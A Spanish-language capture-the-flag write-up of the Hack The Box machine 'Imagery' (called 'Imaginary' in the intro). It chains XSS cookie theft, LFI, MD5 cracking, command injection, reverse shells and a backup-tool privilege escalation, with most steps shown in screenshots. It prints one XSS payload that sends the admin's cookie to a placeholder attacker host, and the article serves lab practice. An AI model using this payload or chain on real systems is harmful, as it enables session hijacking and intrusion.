---
title: Imagery WriteUp Hack The Box
published: true
---

# Introducción

Hoy vamos a resolver **Imaginary**, una máquina de nivel medio de HackTheBox que nos permitirá practicar diversas técnicas de pentesting web. Esta máquina es particularmente interesante porque combina vulnerabilidades clásicas que todo pentester debe conocer: desde la explotación de XSS (Cross-Site Scripting) para robar cookies de sesión, hasta ataques de Local File Inclusion (LFI) y ejecución remota de comandos.

El escenario nos presenta una aplicación web aparentemente sencilla con funcionalidad de carga de imágenes, pero que esconde múltiples vectores de ataque.

<img src="https://github.com/user-attachments/assets/94185a65-332d-4580-b098-d79dab222910" />


# Reconocimiento
Comenzamos escaneando los puertos abiertos de la máquina. En este caso, tiene abiertos el puerto 22 (SSH), con el que no podremos hacer nada de momento ya que no disponemos de credenciales, y el puerto 8000, donde se encuentra alojada una aplicación web.

<img src="https://github.com/user-attachments/assets/10dc98d8-3076-4805-9aaf-0c400b9e18f6" />

Si accedemos a la máquina a través del puerto 8000, veremos una web con funcionalidades básicas: registro de usuarios e inicio de sesión.

<img src="https://github.com/user-attachments/assets/96c9db32-ac28-4a73-85aa-9d38ffc3567d" />

Después de enumerar posibles subdominios sin resultados, procedo a crear una cuenta y acceder a ella.

<img src="https://github.com/user-attachments/assets/984e7a6a-9937-46cf-b447-cfc271702f62" />

Una vez dentro, las funcionalidades son limitadas: únicamente podemos subir imágenes.

<img src="https://github.com/user-attachments/assets/b8328f6a-1691-456b-bbaf-3739b3ed1726" />

Intento enumerar posibles directorios, pero tampoco encuentro nada relevante.

<img src="https://github.com/user-attachments/assets/6838c880-3c80-45fc-b169-ea853d7c198e" />

Al revisar el código fuente de la web, descubro que existe la ruta `/admin/bug_reports` junto con algunas funciones asociadas a esta ruta.

<img src="https://github.com/user-attachments/assets/a6e2a2cf-f8d0-465e-90da-b56316ba4190" />

Examinando más detenidamente la sección inferior de la web, aparece un botón nuevo que anteriormente no estaba visible y que sirve para informar de fallos en la plataforma.

<img src="https://github.com/user-attachments/assets/42f6acb1-ede7-4788-9432-33e8b24aff02" />

Al acceder a esta sección, nos solicita el nombre del fallo y los detalles del mismo.

<img src="https://github.com/user-attachments/assets/b9064dfc-32b1-4202-893f-b84f7cfde5fb" />



# Explotación
En este tipo de situaciones, la primera opción es probar una inyección XSS. Rellenaremos el formulario con un payload que, cuando el administrador acceda a revisar el reporte y no pueda cargar la imagen, nos envíe su cookie de sesión a nuestro puerto en escucha:

```java
<img src=x onerror="document.location='http://<IPAtacante>:<Puerto>/?cookie='+document.cookie">
```

Pongo el puerto 4444 en escucha para recibir la cookie y después envío el formulario con la inyección de código. Al cabo de unos momentos, recibo una petición GET con la cookie del usuario administrador.

<img src="https://github.com/user-attachments/assets/754a39f1-6bf4-4b4e-bfe0-f5f82a13e87d" />

Presiono F12 para abrir las herramientas de desarrollo y modifico mi cookie de sesión por la cookie obtenida del usuario admin. Al refrescar la página, aparece el botón que nos da acceso al panel de administrador.

<img src="https://github.com/user-attachments/assets/2b516b37-3827-42bf-9336-b53b7f00607e" />

Dentro de este panel podemos descargar los registros de los usuarios que se han registrado en la web y los fallos que han sido reportados.

<img src="https://github.com/user-attachments/assets/d84df4af-1264-4052-87b1-6caf2bfeeb96" />

Intercepto la petición cuando pulso el botón "Download Log" para ver qué ocurre por detrás. Al probar un ataque de Local File Inclusion (LFI), descubro que podemos enumerar cualquier archivo de la máquina.

<img src="https://github.com/user-attachments/assets/2ba7653c-da71-41b7-b302-4d8b6d2bb940" />

Probando archivos comunes como `/proc/self/environ`, encuentro que existe la ruta `/home/web`, donde podrían estar los archivos de configuración de la aplicación.

<img src="https://github.com/user-attachments/assets/10468315-a882-42ea-a976-a9e3ca351053" />

Tras enumerar varios archivos, localizo un archivo de configuración que describe cómo está configurada la web. Dentro de este archivo encuentro la ruta de la base de datos de la aplicación.

<img src="https://github.com/user-attachments/assets/15a7e9f7-d847-449a-a85d-5de08f5af0f2" />

Al leer el archivo de la base de datos, encuentro los usuarios creados en la web y sus contraseñas cifradas con MD5.

<img src="https://github.com/user-attachments/assets/863e8d10-9baf-4a5e-b17c-38831d1d07fe" />

Como ya hemos accedido a la web con el usuario "admin", pruebo a acceder con el usuario "testuser". Copio su contraseña cifrada y la descifro con [CrackStation](https://crackstation.net/).

<img src="https://github.com/user-attachments/assets/62b043bb-3793-4335-b5d2-6c341c786bca" />

Al acceder a la cuenta de "testuser", tenemos los mismos botones que un usuario normal. Procedo a subir una foto y experimentar con las funcionalidades disponibles.

<img src="https://github.com/user-attachments/assets/8c9e3779-569a-429e-9c08-441cbd8bfb57" />

El formulario solicita la imagen que queremos subir junto con algunos parámetros adicionales.

<img src="https://github.com/user-attachments/assets/aef9781a-08c9-437e-8801-3f519c9417a2" />

Dentro de las opciones podemos recortar la imagen. Intercepto la petición que se genera cuando modificamos la imagen.

<img src="https://github.com/user-attachments/assets/0833ad97-3a70-4fd8-88f2-2244621ce78a" />

Dentro de las opciones podemos recortar la imagen. Intercepto la petición que se genera cuando modificamos la imagen.

<img src="https://github.com/user-attachments/assets/b9dd29e0-01ed-4300-91d4-54ad7fc48874" />

<img src="https://github.com/user-attachments/assets/7f142cb5-9814-44ac-b979-0f65d4a22056" />

Descubro que podemos ejecutar comandos del sistema desde cualquier parámetro de la petición.

<img src="https://github.com/user-attachments/assets/6ec77e11-3bde-418e-b966-36ce6a8919d0" />

Sabiendo esto, puedo crear una reverse shell. Pongo mi máquina en escucha y envío la petición con el comando de conexión remota. Si todo ha ido bien, obtengo acceso a la máquina como el usuario "web".

<img src="https://github.com/user-attachments/assets/08644688-789a-4a60-8330-c875b3e54fc6" />

Tras realizar una enumeración exhaustiva de la máquina, encuentro en la ruta `/var/backup` un archivo cifrado con extensión `.aes`.

<img src="https://github.com/user-attachments/assets/8828cf71-90f8-46af-a1fa-84586b024e3d" />

Como la máquina tiene Python instalado, creo un servidor web dentro de la máquina para copiar el archivo a mi equipo e intentar descifrarlo.

<img src="https://github.com/user-attachments/assets/d602b3ef-400e-49df-9f10-59d2ad632f7a" />

Una vez iniciado el servidor, utilizo `wget` para descargar el archivo.

<img src="https://github.com/user-attachments/assets/dd7e3736-6555-4914-b845-656313bd6066" />

Con un poco de investigación, encuentro herramientas que realizan fuerza bruta a este tipo de archivos cifrados. En mi caso, utilicé [dpyAesCrypt.py](https://github.com/Nabeelcn25/dpyAesCrypt.py/tree/main) por su facilidad de uso. Al ejecutar la herramienta seguida del archivo cifrado y del diccionario de palabras, tras un tiempo de procesamiento, el código extrae la clave del archivo y lo descifra.

<img src="https://github.com/user-attachments/assets/3630d4b3-7f1d-4db7-82a4-75663984eb4b" />

Al extraer el archivo `.zip`, obtengo todos los archivos de la copia de seguridad de la web. Si reviso la base de datos que vimos anteriormente, encuentro que había otro usuario con su contraseña cifrada en formato MD5.

<img src="https://github.com/user-attachments/assets/acd08d33-08ad-4b02-bc01-d80a6b970c61" />

Repito el mismo proceso: copio y pego la contraseña cifrada en [CrackStation](https://crackstation.net/).

<img src="https://github.com/user-attachments/assets/974e4025-0923-4502-82d0-eb503e950a6d" />

Ahora tengo la contraseña de "mark". Accedo a su cuenta del sistema y obtengo la primera flag.

<img src="https://github.com/user-attachments/assets/4ca900a4-f18e-4d0a-958c-5d508700964e" />

# Escalada de privilegios
Ya queda menos: solo falta la fase de escalada de privilegios para convertirnos en administrador del sistema. Lo más común es comenzar enumerando todo lo que puede ejecutar el usuario "mark" con permisos de administrador en la máquina. En este caso, "mark" puede ejecutar con permisos de administrador la aplicación "charol", un programa para crear copias de seguridad en archivos comprimidos.

<img src="https://github.com/user-attachments/assets/4d33e527-c8c3-4225-93b8-4189e62f9db1" />

Como no sabemos qué contraseña tenía "mark" en esta herramienta, voy a reiniciarla y eliminar su contraseña. Una vez obtengo acceso a la herramienta, ejecuto el comando `help` para ver qué funciones puede realizar el programa.

<img src="https://github.com/user-attachments/assets/1a5c83ab-aaa9-4f76-8df1-6781ebb0d34c" />

Al parecer, el programa permite programar la ejecución de comandos cada cierto tiempo. Como la aplicación tiene permisos de administrador, puedo crear una reverse shell que me dé acceso al usuario "root" cada segundo.

<img src="https://github.com/user-attachments/assets/3f54da1f-306f-40e5-978d-359efdb4ba4a" />

Finalmente, una vez obtenida la conexión remota como el usuario "root", puedo obtener la última flag de la máquina.

# Conclusión
Y con esto llegamos al final de la resolución de **Imaginary**. Esta máquina nos ha permitido practicar una cadena completa de explotación que incluye múltiples vulnerabilidades comunes en aplicaciones web reales.

Espero que este writeup te haya resultado útil. ¡Nos vemos en la próxima publicación!

![ken](https://github.com/user-attachments/assets/5d3b3dee-0cea-4e46-b4cd-0fbcfe6feeb1)
